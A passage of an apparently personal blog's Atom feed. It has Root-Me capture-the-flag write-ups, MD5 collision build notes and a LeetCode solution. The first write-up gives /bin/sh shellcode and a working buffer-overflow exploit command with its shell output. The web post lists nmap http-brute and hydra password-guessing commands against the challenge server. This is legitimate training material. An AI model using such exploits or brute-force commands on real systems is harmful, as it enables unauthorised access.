class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jmp <span class="keyword">short</span> mycall      ; Immediately jump to the call instruction</span><br><span class="line"></span><br><span class="line">shellcode:</span><br><span class="line">    pop   esi         ; Store the address of <span class="string">&quot;/bin/sh&quot;</span> in ESI</span><br><span class="line">    [...]</span><br><span class="line"></span><br><span class="line">mycall:</span><br><span class="line">    call  shellcode   ; Push the address of the next byte onto the <span class="built_in">stack</span>: the next</span><br><span class="line">    db    <span class="string">&quot;/bin/sh&quot;</span>   ;   byte is the beginning of the <span class="built_in">string</span> <span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">get_shell.<span class="keyword">asm</span></span><br><span class="line">jmp <span class="keyword">short</span>    mycall               ; Immediately jump to the call instruction</span><br><span class="line"></span><br><span class="line">shellcode:</span><br><span class="line">    pop        esi                ; Store the address of <span class="string">&quot;/bin/sh&quot;</span> in ESI</span><br><span class="line">    <span class="keyword">xor</span>        eax, eax           ; Zero out EAX 通过EAX获得<span class="literal">NULL</span></span><br><span class="line">    mov byte   [esi + <span class="number">7</span>], al      ; Write the null byte at the end of the <span class="built_in">string</span> 在字符串后添加终结符</span><br><span class="line">    mov dword  [esi + <span class="number">8</span>],  esi    ; [ESI+<span class="number">8</span>], i.e. the memory immediately below the <span class="built_in">string</span></span><br><span class="line">                                  ;   <span class="string">&quot;/bin/sh&quot;</span>, will contain the <span class="built_in">array</span> pointed to by the</span><br><span class="line">                                  ;   <span class="function">second argument of <span class="title">execve</span><span class="params">(<span class="number">2</span>)</span></span>; therefore we store in</span><br><span class="line">                                  ;   [ESI+<span class="number">8</span>] the address of the <span class="built_in">string</span>...</span><br><span class="line">    mov dword  [esi + <span class="number">12</span>], eax    ; ...<span class="keyword">and</span> in [ESI+<span class="number">12</span>] <span class="function">the <span class="literal">NULL</span> <span class="title">pointer</span> <span class="params">(EAX is <span class="number">0</span>)</span></span></span><br><span class="line">    mov        al,  0xb           ; Store the number of the syscall (11) in EAX</span><br><span class="line">    lea        ebx, [esi]         ; Copy the address of the <span class="built_in">string</span> in EBX 参数</span><br><span class="line">    lea        ecx, [esi + <span class="number">8</span>]     ; <span class="function">Second argument to <span class="title">execve</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line">    lea        edx, [esi + 12]    ; Third argument to execve(2) (NULL pointer)</span><br><span class="line">    <span class="keyword">int</span>        <span class="number">0x80</span>               ; Execute the system call</span><br><span class="line"></span><br><span class="line">mycall:</span><br><span class="line">    call       shellcode          ; Push the address of <span class="string">&quot;/bin/sh&quot;</span> onto the <span class="built_in">stack</span></span><br><span class="line">    db         <span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure><pre><code>$ nasm -f elf get_shell.asm$ ojdump -d get_shell.o</code></pre><p>汇编后得到对象文件，查看机器码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app-systeme-ch7@challenge02:~$ .&#x2F;ch7 &#96;python -c &quot;print &#39;\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68&#39; + &#39;A&#39;*474 + &#39;\x40\xa0\x04\x08&#39;&quot;&#96;</span><br><span class="line">[+] Running program with username : ë^1ÀˆF‰‰F</span><br><span class="line">°</span><br><span class="line">   V</span><br><span class="line"> ̀èãÿÿÿ&#x2F;bin&#x2F;shAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@ </span><br><span class="line">$ ls</span><br><span class="line">Makefile  ch7  ch7.c</span><br><span class="line">$ cat .passwd</span><br><span class="line">cat: .passwd: Permission denied</span><br></pre></td></tr></table></figure><p>shellcode权限不足</p><p><a href="http://shell-storm.org/shellcode/files/shellcode-599.php">http://shell-storm.org/shellcode/files/shellcode-599.php</a><br>\x6a\x17\x58\x31\xdb\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80<br>将0x17 改为0x46<br>When the permissions are setted to “s” instead of “S” a classic shellcode does not set EUID and UID of the current process to old UID (here app-systeme-ch7-cracked):<br>0x46 “sys_setreuid16” not the classic 0x17 “sys_setuid16” </p><hr><p>结构中函数指针<br>struct Dog {<br>    char name[12];<br>    void (<em>bark)();<br>    void (*bringBackTheFlag)();<br>    void (*death)(struct Dog</em>);<br>};</p><p><a href="https://cc-sir.github.io/2019/01/11/use_after_free/">https://cc-sir.github.io/2019/01/11/use_after_free/</a></p><p>use_after_free就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况:<br>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。<br>内存块被释放后，其对应的指针没有被设置为NULL，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。<br>内存块被释放后，其对应的指针没有被设置为NULL，但是在它下一次使用之前，有代码对这块内存行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。<br>而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ELF x86 - BSS buffer overflow &amp;amp; 构造shellcode&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; username[&lt;span class=&quot;number&quot;&gt;512&lt;/span&gt;] = &amp;#123;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*_atexit)(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;) =  &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;cp_username&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *name, &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *arg)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;((*(name++) = *(arg++)));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  *name = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; **argv)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(argc != &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;[-] Usage : %s &amp;lt;username&amp;gt;\n&amp;quot;&lt;/span&gt;, argv[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  cp_username(username, argv[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;[+] Running program with username : %s\n&amp;quot;&lt;/span&gt;, username);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  _atexit(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>web-server前四题</title>
    <link href="http://finsenty54.github.io/2020/12/20/web-server-front-4/"/>
    <id>http://finsenty54.github.io/2020/12/20/web-server-front-4/</id>
    <published>2020-12-20T05:41:40.000Z</published>
    <updated>2020-12-20T05:43:03.593Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Weak-password"><a href="#Weak-password" class="headerlink" title="Weak password"></a>Weak password</h1><h2 id="tNikto"><a href="#tNikto" class="headerlink" title="tNikto"></a>tNikto</h2><p>Nikto是一款开源的（GPL）网页服务器扫描器，它可以对网页服务器进行全面的多种扫描，包含超过3300种有潜在危险的文件／CGIs；超过625种服务器版本；超过230种特定服务器问题。</p><p><code>nikto -host http://challenge01.root-me.org/web-serveur/ch3/</code></p><a id="more"></a><hr><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p><code>nmap -d -vv -p 80 --script http-brute --script-args http-brute.path=/web-serveur/ch3/ challenge01.root-me.org</code></p><pre><code>-d: Increase debugging level-v: Increase verbosity level (use -vv or more for greater effect)--script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of directories, script-files or script-categories--script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts</code></pre><hr><h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><p><code>hydra -L userList.txt -P passwordsList.txt 212.129.38.224 http-head /web-serveur/ch3/ </code> </p><pre><code>- users list inspired by http://blog.infowebmaster.fr/public/resource/wordpress-brute-force-login-a-eviter.txt- passwords list downloaded from http://blog.teckn0.com/wp-content/uploads/brute_force/Liste_mot_%20anglais.7z</code></pre><h1 id="user-agent"><a href="#user-agent" class="headerlink" title="user-agent"></a>user-agent</h1><p><code>curl -L -A &quot;admin&quot; challenge01.root-me.org/web-serveur/ch2</code><br>     -A, –user-agent <name> Send User-Agent <name> to server<br>    -L, –location      Follow redirects</p><hr><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">resp = requests.get(<span class="string">&#x27;http://challenge01.root-me.org/web-serveur/ch2/&#x27;</span>, headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Admin&#x27;</span>&#125;) </span><br><span class="line"><span class="built_in">print</span> resp.text</span><br></pre></td></tr></table></figure><h1 id="HTTP-open-redirt"><a href="#HTTP-open-redirt" class="headerlink" title="HTTP open redirt"></a>HTTP open redirt</h1><h2 id="hash-identifier"><a href="#hash-identifier" class="headerlink" title="hash-identifier"></a>hash-identifier</h2><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> Select a domain to <span class="built_in">hash</span> <span class="keyword">not</span> listed <span class="keyword">in</span> the page, like: https://google.com</span><br><span class="line"><span class="number">2.</span> Hash the string domain here <span class="keyword">or</span> another: http://www.fileformat.info/tool/<span class="built_in">hash</span>.htm</span><br><span class="line">3. Construct the url like this and press enter: http://challenge01.root-me.org/web-serveur/ch52/?url=##DOMAIN##&amp;h=##HASH##</span><br><span class="line"><span class="number">4.</span> When new page <span class="keyword">is</span> loading, you can see the flag, stop the redirection pressing escape <span class="keyword">and</span> copy it.</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Weak-password&quot;&gt;&lt;a href=&quot;#Weak-password&quot; class=&quot;headerlink&quot; title=&quot;Weak password&quot;&gt;&lt;/a&gt;Weak password&lt;/h1&gt;&lt;h2 id=&quot;tNikto&quot;&gt;&lt;a href=&quot;#tNikto&quot; class=&quot;headerlink&quot; title=&quot;tNikto&quot;&gt;&lt;/a&gt;tNikto&lt;/h2&gt;&lt;p&gt;Nikto是一款开源的（GPL）网页服务器扫描器，它可以对网页服务器进行全面的多种扫描，包含超过3300种有潜在危险的文件／CGIs；超过625种服务器版本；超过230种特定服务器问题。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nikto -host http://challenge01.root-me.org/web-serveur/ch3/&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="web-server in root me" scheme="http://finsenty54.github.io/categories/web-server-in-root-me/"/>
    
    
    <category term="web" scheme="http://finsenty54.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>md5快速碰撞</title>
    <link href="http://finsenty54.github.io/2020/12/17/md5%E5%BF%AB%E9%80%9F%E7%A2%B0%E6%92%9E/"/>
    <id>http://finsenty54.github.io/2020/12/17/md5%E5%BF%AB%E9%80%9F%E7%A2%B0%E6%92%9E/</id>
    <published>2020-12-17T11:31:08.000Z</published>
    <updated>2020-12-17T11:45:13.030Z</updated>
    
    <content type="html"><![CDATA[<h1 id="md5快速碰撞"><a href="#md5快速碰撞" class="headerlink" title="md5快速碰撞"></a>md5快速碰撞</h1><p><a href="https://github.com/Finsenty54/fast_collision">https://github.com/Finsenty54/fast_collision</a></p><h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><h3 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h3><p><a href="https://www.runoob.com/w3cnote/cpp-header.html">https://www.runoob.com/w3cnote/cpp-header.html</a><br>C++ 语言支持”分别编译”（separatecompilation）。也就是说，一个程序所有的内容，可以分成不同的部分分别放在不同的 .cpp 文件里。.cpp 文件里的东西都是相对独立的，在编译（compile）时不需要与其他文件互通，只需要在编译成<code>目标文件</code>后再与其他的目标文件做一次<code>链接</code>（link）就行了。</p><a id="more"></a><h3 id="条件编译"><a href="#条件编译" class="headerlink" title="条件编译"></a>条件编译</h3><h3 id="boost安装"><a href="#boost安装" class="headerlink" title="boost安装"></a>boost安装</h3><p><code>./b2 install </code>后</p><p>执行<code>sudo ldconfig</code><br>运行程序后就能加载共享库</p><p><em>程序运行结果</em></p><pre><code>┌─[zentreisender@parrotos]─[~/Documents/essay!!!!!!!!!!/hash_collision/fast_collision]└──╼ $./first_try Generating first block: ........ 6.637388s wall, 6.620000s user + 0.000000s system = 6.620000s CPU (99.7%)</code></pre><hr><h3 id="查找后缀文件"><a href="#查找后缀文件" class="headerlink" title="查找后缀文件"></a>查找后缀文件</h3><pre><code>find -name &quot;*.txt&quot; | xargs rmxargs --helpUsage: xargs [OPTION]... COMMAND [INITIAL-ARGS]...</code></pre><hr><pre><code>find ./ -regextype posix-extended -regex &quot;.*\.(txt|bin)&quot; </code></pre><h3 id="vscodium调试"><a href="#vscodium调试" class="headerlink" title="vscodium调试"></a>vscodium调试</h3><p>注意在调试时需要在<code>makefile</code>文件中配置好debug（方法参考2.使用命令行调试大型程序部分），否则无法标记断点。</p><p><code>在生成对象文件时加 -g</code></p><h3 id="parrot-os安装中文输入法"><a href="#parrot-os安装中文输入法" class="headerlink" title="parrot os安装中文输入法"></a>parrot os安装中文输入法</h3><p><a href="https://parrotsec-cn.org/t/ibus-rime/3950">https://parrotsec-cn.org/t/ibus-rime/3950</a><br>ibus-rime</p><h3 id="函数常数是数组"><a href="#函数常数是数组" class="headerlink" title="函数常数是数组"></a>函数常数是数组</h3><p>C++ 传数组给一个函数，数组类型自动转换为指针类型，因而传的实际是地址。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;md5快速碰撞&quot;&gt;&lt;a href=&quot;#md5快速碰撞&quot; class=&quot;headerlink&quot; title=&quot;md5快速碰撞&quot;&gt;&lt;/a&gt;md5快速碰撞&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Finsenty54/fast_collision&quot;&gt;https://github.com/Finsenty54/fast_collision&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;C&quot;&gt;&lt;a href=&quot;#C&quot; class=&quot;headerlink&quot; title=&quot;C++&quot;&gt;&lt;/a&gt;C++&lt;/h2&gt;&lt;h3 id=&quot;头文件&quot;&gt;&lt;a href=&quot;#头文件&quot; class=&quot;headerlink&quot; title=&quot;头文件&quot;&gt;&lt;/a&gt;头文件&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://www.runoob.com/w3cnote/cpp-header.html&quot;&gt;https://www.runoob.com/w3cnote/cpp-header.html&lt;/a&gt;&lt;br&gt;C++ 语言支持”分别编译”（separatecompilation）。也就是说，一个程序所有的内容，可以分成不同的部分分别放在不同的 .cpp 文件里。.cpp 文件里的东西都是相对独立的，在编译（compile）时不需要与其他文件互通，只需要在编译成&lt;code&gt;目标文件&lt;/code&gt;后再与其他的目标文件做一次&lt;code&gt;链接&lt;/code&gt;（link）就行了。&lt;/p&gt;</summary>
    
    
    
    <category term="HASH" scheme="http://finsenty54.github.io/categories/HASH/"/>
    
    
    <category term="C++" scheme="http://finsenty54.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>leetcode longest_substring_without_repeating_characters</title>
    <link href="http://finsenty54.github.io/2020/12/11/LEETCODE-longest_substring_without_repeating_characters/"/>
    <id>http://finsenty54.github.io/2020/12/11/LEETCODE-longest_substring_without_repeating_characters/</id>
    <published>2020-12-11T08:49:29.000Z</published>
    <updated>2020-12-11T08:51:36.726Z</updated>
    
    <content type="html"><![CDATA[<h2 id="longest-substring-without-repeating-characters"><a href="#longest-substring-without-repeating-characters" class="headerlink" title="longest_substring_without_repeating_characters"></a>longest_substring_without_repeating_characters</h2><p>这题用到了哈希表 和 滑动窗口</p><p>滑动窗口：<br>就是有两个变量分别指示 窗口的 头和尾，就可以任意改变这两个变量</p><p>哈希表：<br>哈希表存着目前最长子组的值-地址对</p><a id="more"></a><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Solution::lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> begin=<span class="number">0</span>,end=<span class="number">0</span>,begin_new=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">unordered_map</span>&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; windows;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; s.size(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//windows.insert(make_pair(s[i],i));</span></span><br><span class="line">        <span class="keyword">if</span>(windows.count(s[end])==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            windows.insert(<span class="built_in">make_pair</span>(s[end],end));</span><br><span class="line">            end++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//有重复值，那么获得目前的最大值</span></span><br><span class="line">            <span class="keyword">if</span> (end-begin&gt;count || count==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                count=end-begin;</span><br><span class="line">            &#125;</span><br><span class="line">            begin_new=windows[s[end]]+<span class="number">1</span>;</span><br><span class="line">            <span class="comment">//delete </span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">size_t</span> i = begin; i &lt; begin_new; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                windows.erase(s[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//插入新的重复值</span></span><br><span class="line">            windows.insert(<span class="built_in">make_pair</span>(s[end],end));</span><br><span class="line">            end++;</span><br><span class="line">            begin=begin_new;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (end-begin&gt;count)</span><br><span class="line">    &#123;</span><br><span class="line">        count=end-begin;</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> count;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/rAyOUO"><img src="https://s3.ax1x.com/2020/12/11/rAyOUO.jpg" alt="rAyOUO.jpg"></a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;longest-substring-without-repeating-characters&quot;&gt;&lt;a href=&quot;#longest-substring-without-repeating-characters&quot; class=&quot;headerlink&quot; title=&quot;longest_substring_without_repeating_characters&quot;&gt;&lt;/a&gt;longest_substring_without_repeating_characters&lt;/h2&gt;&lt;p&gt;这题用到了哈希表 和 滑动窗口&lt;/p&gt;
&lt;p&gt;滑动窗口：&lt;br&gt;就是有两个变量分别指示 窗口的 头和尾，就可以任意改变这两个变量&lt;/p&gt;
